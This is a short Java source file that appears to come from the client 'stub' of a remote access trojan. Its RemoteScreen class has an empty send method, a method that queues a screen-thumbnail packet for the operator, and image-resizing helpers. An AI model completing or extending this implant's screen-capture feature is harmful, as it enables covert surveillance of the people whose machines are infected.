package pro.jrat.stub;

import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;

import pro.jrat.stub.packets.outgoing.Packet33Thumbnail;

public class RemoteScreen {

	public static void send(boolean once, double size, int quality, int monitor, int rows, int columns, DataOutputStream dos) {
		try {
			
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void sendThumbnail() {
		try {
			Connection.addToSendQueue(new Packet33Thumbnail());
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static BufferedImage resize(BufferedImage image, int w, int h) {
		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_3BYTE_BGR);
		Graphics2D gr = img.createGraphics();
		gr.drawImage(image.getScaledInstance(w, h, BufferedImage.SCALE_SMOOTH), 0, 0, w, h, null);
		gr.dispose();
		return img;
	}

	public static BufferedImage resize(BufferedImage image, double percent) {
		int scaledWidth = (int) (image.getWidth() * percent);
		int scaledHeight = (int) (image.getHeight() * percent);
		return resize(image, scaledWidth, scaledHeight);
	}

}
